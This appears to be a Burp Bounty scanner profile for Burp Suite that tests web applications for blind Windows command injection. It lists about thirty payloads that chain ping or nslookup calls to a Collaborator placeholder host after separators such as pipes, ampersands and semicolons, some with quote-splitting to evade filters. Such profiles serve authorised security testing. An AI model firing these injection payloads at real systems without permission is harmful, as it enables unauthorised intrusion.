[
  {
    "ProfileName": "Blind_RCE_Windows",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true, |ping {BC}",
      "true, ||ping {BC}",
      "true, \u0026\u0026ping {BC}",
      "true, ;ping {BC}",
      "true, \u0026ping {BC}",
      "true, |p\u0027i\u0027n\u0027g\u0027 {BC}",
      "true, ||p\u0027i\u0027n\u0027g\u0027 {BC}",
      "true, \u0026p\u0027i\u0027n\u0027g\u0027 {BC}",
      "true, \u0026\u0026p\u0027i\u0027n\u0027g\u0027 {BC}",
      "true, ;p\u0027i\u0027n\u0027g\u0027 {BC}",
      "true,  |nslookup {BC}",
      "true, ||nslookup {BC}",
      "true, \u0026\u0026nslookup {BC}",
      "true, ;nslookup {BC}",
      "true, \u0026nslookup {BC}",
      "true, |n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 {BC}",
      "true, ||n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 {BC}",
      "true, \u0026\u0026n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 {BC}",
      "true, ;n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 {BC}",
      "true, \u0026n\u0027s\u0027l\u0027o\u0027o\u0027k\u0027u\u0027p\u0027 {BC}",
      "true, |p\"i\"n\"g\" {BC}",
      "true, ||p\"i\"n\"g\" {BC}",
      "true, \u0026\u0026p\"i\"n\"g\" {BC}",
      "true, ;p\"i\"n\"g\" {BC}",
      "true, \u0026p\"i\"n\"g\" {BC}",
      "true, |n\"s\"l\"o\"o\"k\"u\"p\" {BC}",
      "true, ||n\"s\"l\"o\"o\"k\"u\"p\" {BC}",
      "true, \u0026\u0026n\"s\"l\"o\"o\"k\"u\"p\" {BC}",
      "true, ;n\"s\"l\"o\"o\"k\"u\"p\" {BC}",
      "true, \u0026n\"s\"l\"o\"o\"k\"u\"p\" {BC}"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026",
    "Grep": [],
    "Tags": [
      "All",
      "RCE"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 5,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Blind_RCE_Windows",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]